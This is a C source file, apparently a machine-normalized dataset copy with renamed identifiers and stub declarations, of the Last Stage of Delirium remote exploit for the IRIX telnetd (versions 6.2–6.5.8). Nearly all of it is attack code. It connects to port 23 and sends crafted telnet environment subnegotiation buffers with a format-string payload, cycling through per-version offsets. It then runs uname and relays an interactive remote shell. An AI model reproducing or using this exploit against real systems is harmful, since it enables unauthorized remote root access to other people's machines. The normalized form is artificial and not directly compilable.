
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {char* h_addr; } ;
typedef int fd_set ;
typedef int buffer ;
struct TYPE_4__ {char* vers; } ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 scalar_t__ VAR_2 ;
 scalar_t__ VAR_3 ;
 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int VAR_4 ;
 int FUNC_2 (int *) ;
 int VAR_5 ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int) ;
 scalar_t__ FUNC_5 (int,struct sockaddr*,int) ;
 char* VAR_6 ;
 scalar_t__ VAR_7 ;
 int FUNC_6 (int) ;
 int FUNC_7 (int ) ;
 struct hostent* FUNC_8 (char*) ;
 int FUNC_9 (int,char**,char*) ;
 int FUNC_10 (int) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (char*,char*,int) ;
 int VAR_8 ;
 int FUNC_13 (char*) ;
 int FUNC_14 (int) ;
 int FUNC_15 (char*,...) ;
 int FUNC_16 (int,char*,int) ;
 scalar_t__ FUNC_17 (int ,int *,int *,int *,int *) ;
 int FUNC_18 (int) ;
 int FUNC_19 (int ,int ,int ) ;
 int FUNC_20 (char*,char*,char*) ;
 int VAR_9 ;
 TYPE_2__* VAR_10 ;
 int FUNC_21 (int,char*,int) ;

FUNC_22(int VAR_11,char **VAR_12){
    char VAR_13[1024];
    int VAR_14,VAR_15,VAR_16,VAR_17,VAR_18,VAR_19,VAR_20=65;
    struct hostent *VAR_21;
    struct sockaddr_in VAR_22;

    FUNC_15("copyright LAST STAGE OF DELIRIUM jul 2000 poland  //lsd-pl.net/\n");
    FUNC_15("telnetd for irix 6.2 6.3 6.4 6.5 6.5.8 IP:all\n\n");

    if(VAR_11<2){
        FUNC_15("usage: %s address [-v 62|63|64|65]\n",VAR_12[0]);
        FUNC_6(-1);
    }

    while((VAR_15=FUNC_9(VAR_11-1,&VAR_12[1],"sc:p:v:"))!=-1){
        switch(VAR_15){
        case 'v': VAR_20=FUNC_3(VAR_8);
        }
    }

    switch(VAR_20){
    case 62: VAR_17=0;VAR_18=5; break;
    case 63: VAR_17=6;VAR_18=8; break;
    case 64: VAR_17=9;VAR_18=10; break;
    case 65: VAR_17=11;VAR_18=12; break;
    default: FUNC_6(-1);
    }

    for(VAR_14=VAR_17;VAR_14<=VAR_18;VAR_14++){
        FUNC_15(".");FUNC_7(VAR_9);
        VAR_16=FUNC_19(VAR_0,VAR_5,0);
        VAR_22.sin_family=VAR_0;
        VAR_22.sin_port=FUNC_10(23);
        if((VAR_22.sin_addr.s_addr=FUNC_11(VAR_12[1]))==-1){
            if((VAR_21=FUNC_8(VAR_12[1]))==((void*)0)){
                VAR_7=VAR_1;FUNC_13("error");FUNC_6(-1);
            }
            FUNC_12(&VAR_22.sin_addr.s_addr,VAR_21->h_addr,4);
        }

        if(FUNC_5(VAR_16,(struct sockaddr*)&VAR_22,sizeof(struct sockaddr_in))<0){
            FUNC_13("error");FUNC_6(-1);
        }

        VAR_19=FUNC_14(VAR_14);
        FUNC_12(VAR_13,"\xff\xfa\x24\x00\x01\x58\x58\x58\x58\x00",10);
        FUNC_20(&VAR_13[10],"%s\xff\xf0",VAR_6);
        FUNC_21(VAR_16,VAR_13,10+VAR_19+2);
        FUNC_18(1);
        FUNC_12(VAR_13,"\xff\xfa\x24\x00\x01\x5f\x52\x4c\x44\x00%s\xff\xf0",10);
        FUNC_20(&VAR_13[10],"%s\xff\xf0",VAR_6);
        FUNC_21(VAR_16,VAR_13,10+VAR_19+2);

        if(((VAR_19=FUNC_16(VAR_16,VAR_13,sizeof(VAR_13)))<2)||(VAR_13[0]!=0xff)){
            FUNC_15("error: telnet service seems to be used with tcp wrapper\n");
            FUNC_6(-1);
        }

        FUNC_21(VAR_16,"/bin/uname -a\n",14);
        if((VAR_19=FUNC_16(VAR_16,VAR_13,sizeof(VAR_13)))>0){
            FUNC_15("\n%s\n\n",VAR_10[VAR_14].vers);
            FUNC_21(1,VAR_13,VAR_19);
            break;
        }
        FUNC_4(VAR_16);
    }
    if(VAR_14>VAR_18) {FUNC_15("\nerror: not vulnerable\n");FUNC_6(-1);}

    while(1){
        fd_set VAR_23;
        FUNC_2(&VAR_23);
        FUNC_1(0,&VAR_23);
        FUNC_1(VAR_16,&VAR_23);
        if(FUNC_17(VAR_4,&VAR_23,((void*)0),((void*)0),((void*)0))){
            int VAR_24;
            char VAR_25[1024];
            if(FUNC_0(0,&VAR_23)){
                if((VAR_24=FUNC_16(0,VAR_25,1024))<1){
                    if(VAR_7==VAR_3||VAR_7==VAR_2) continue;
                    else break;
                }
                FUNC_21(VAR_16,VAR_25,VAR_24);
            }
            if(FUNC_0(VAR_16,&VAR_23)){
                if((VAR_24=FUNC_16(VAR_16,VAR_25,1024))<1){
                    if(VAR_7==VAR_3||VAR_7==VAR_2) continue;
                    else break;
                }
                FUNC_21(1,VAR_25,VAR_24);
            }
        }
    }
}
